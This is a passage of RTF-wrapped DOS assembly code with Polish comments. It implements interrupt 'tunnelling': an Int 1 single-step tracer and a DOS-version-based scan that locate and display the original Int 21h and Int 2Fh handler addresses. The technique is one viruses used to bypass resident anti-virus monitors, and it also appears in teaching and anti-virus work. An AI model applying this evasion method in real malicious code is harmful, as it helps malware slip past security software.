\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch            mov  TraceMode,OFF           ; wylacz flage tracera}{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch            pushf                        ; \\    wylacz tryb krokowy}{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch            pop  ax                      ;  \\   procesora}{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch            and  ah,0FEH                 ;   \\}{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch            push ax                      ;  /}{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch            popf                         ; /}{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch                                         ; \\  przywroc stary adres przerwania}{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch            lds  dx,dword ptr cs:of1     ;  / krokowego Int 1}{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch            mov  ax,2501h                ; /}{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch            int  21h}{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch            pop  si                      ; \\}{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch            pop  dx                      ;  \\}{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch            pop  cx                      ;   \\ przywroc zmieniane rejestry}{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch            pop  bx                      ;    /}{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch            pop  ax                      ;   /}{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch            pop  es                      ;  /}{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch            pop  ds                      ; /}{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch            ret                          ; powrot z procedury}{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch Tracing21 endp}{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch Tracer_21  proc far}{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch            push bp                      ; zachowaj zmieniany rejestr}{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch            mov  bp,sp                   ; BP wskazuje na stos}{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch                                         ; [bp+00]  BP}{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch                                         ; [bp+02]  IP}{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch                                         ; [bp+04]  CS}{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch                                         ; [bp+06]  FLAGS}{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch            push ax                      ; zachowaj zmieniany rejestr}{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch            cmp  cs:TraceMode,ON         ; czy wlaczony tracer ?}{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch            jne  Tracer_21Exit           ; jesli nie, to wyskocz z procedury}{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch            mov  ax,[bp+04]              ; AX=CS instrukcji}{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch            cmp  ax,cs:ShowSeg           ; czy segment kodu ten sam}{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch            je   OldSeg21                ; tak=wyskocz procedury}{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch            mov  cs:ShowSeg,ax           ; nie=zachowaj nowy adres seg:ofs}{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch            mov  ax,[bp+02]              ; AX=CS instrukcji}{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch            mov  cs:ShowOfs,ax           ; AX=IP instrukcji}{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch OldSeg21:}{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch            cmp bx,cs:MagicNum1          ; \\}{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch            jne Tracer_21Exit            ;  \\  czy funkcja juz sie wykonala ?}{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch                                         ;   / nie=wyskocz z procedury}{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch            mov cs:TraceMode,OFF         ;  /  tak=wylacz tracer, bo adres}{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch                                         ; /   znaleziony}{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch Tracer_21Exit:                          ; koniec przerwania Int 1}{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch            pop ax                       ; przywroc zmieniany rejestr}{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch            or   byte ptr [bp+7],1       ; [bp+06]  FLAGS, ustaw}{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch                                         ; bit TF dla nastepnego rozkazu}{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch                                         ; wykonywanego po IRET}{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch            pop  bp                      ; przywroc zmieniany rejestr}{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch            iret                         ; powrot z przerwania Int 1}{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch Tracer_21  endp}{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch GetOriginal2F  proc near}{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch            push si                      ; zachowaj zmieniany rejestr}{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch            lea  si,TeGet2F              ; \\ pokaz info o przerwaniu 2Fh}{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch            Call Print                   ; /}{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch            Call LookUpTable2F           ; wez adres 2Fh}{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch                                         ; tablica stalych adresow}{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch            Call ShowAddr                ; pokaz adres 21h}{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch            pop  si                      ; przywroc zmieniany rejestr}{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch            ret                          ; powrot z procedury}{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch GetOriginal2F  endp}{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch LookUpTable2F proc near}{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch            push es                      ; \\}{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch            push ax                      ;  \\ zachowaj zmieniane rejestry}{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch            push bx                      ;  /}{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch            push si                      ; /}{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch            lea  si,TeLookUpTable2F      ; \\ wyswietl info o metodzie}{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch            Call Print                   ; /}{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch            xor  ax,ax                   ; \\ zeruj zmienne pomocnicze}{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch            mov  ShowSeg,ax              ;  /}{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch            mov  ShowOfs,ax              ; /}{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch            mov  ShowError, offset TeLookUpTableFailDOSVer}{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch                                         ; ewentualny komunikat o bledzie}{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch            mov  ah,30h                  ; \\ wez wersje DOS}{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch            int  21h                     ; /}{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch            xchg al,ah                   ; ax=wersja DOS, ah=major,al=minor}{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch            mov  bx,10C6h                ; ofset dla DOS 5.0 - 6.22}{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch            cmp  ax,0500h                ; wersja musi byc wieksza od 5.00}{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch            jb   LookUpTable2F_Exit      ; mniejsza=tuneling nie zadziala}{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch            cmp  ax,0622h                ; dla wersji wiekszej od 6.22}{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch            jbe  DOSVerOk2F              ; jest inny ofset}{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch            mov  bx,0FDAh                ; ofset dla DOS >6.22 (np. 7.0)}{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch DOSVerOk2F:                             ; ofset ustawiony}{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch            push bx                      ; zachowaj go na stosie}{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch            mov  ah,52h                  ; \\ pobierz do ES:BX adres struktury}{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch            int  21h                     ; / LL (lista list)}{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch            pop  bx                      ; przywroc ze stosu ofset do skoku}{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch            mov  ShowError, offset TeLookUpTableFailBadOfs}{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch                                         ; ewentualny komunikat o bledzie}{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch                                         ; czy pod ES;BX jest sekwencja}{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch                                         ; 90 lub EB      NOP \\JMP $+3}{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch                                         ; 90 lub 03      NOP /}{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch                                         ; E8 xx xx       CALL NEAR [IP+xxxx]}{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch                                         ; 2E FF 2E yyyy  JMP FAR CS:[yyyy] ?}{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch            cmp  word ptr es:[bx],9090h}{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch            je   FirstCodeOK2F           ; skocz, gdy sa 2-a NOPy}{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch            cmp  word ptr es:[bx],03EBh}{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch            jne  LookUpTable2F_Exit      ; skocz, gdy JMP $+3}{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch FirstCodeOK2F:}{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch            cmp  byte ptr es:[bx+2],0E8h ;}{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch            jne  LookUpTable2F_Exit      ; skocz, gdy nie ma CALL xxxx}{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch            cmp  word ptr es:[bx+5],0FF2Eh}{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch            jne  LookUpTable2F_Exit      ; skocz, gdy nie ma czesci rozkazu jmp far}{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch            cmp  byte ptr es:[bx+7],02Eh ;}{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch            jne  LookUpTable2F_Exit      ; skocz, gdy nie ma czesci rozkazu jmp far}{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch            mov  bx,word ptr es:[bx+8]   ; \\ pobierz [yyyy]=adres oryginalnej procedury}{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch            les  bx,dword ptr es:[bx]    ; /}{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch            mov  ShowSeg,es              ; przepisz segment i ofset}{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch            mov  ShowOfs,bx              ; potrzebne do wyswietlenia adresu}{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch LookUpTable2F_Exit:                     ; skacz tu, gdy jakis blad}{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch            pop  si}{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch            pop  bx                      ; \\}{\f2\fs24\lang1045{\*\listtag0}\par}
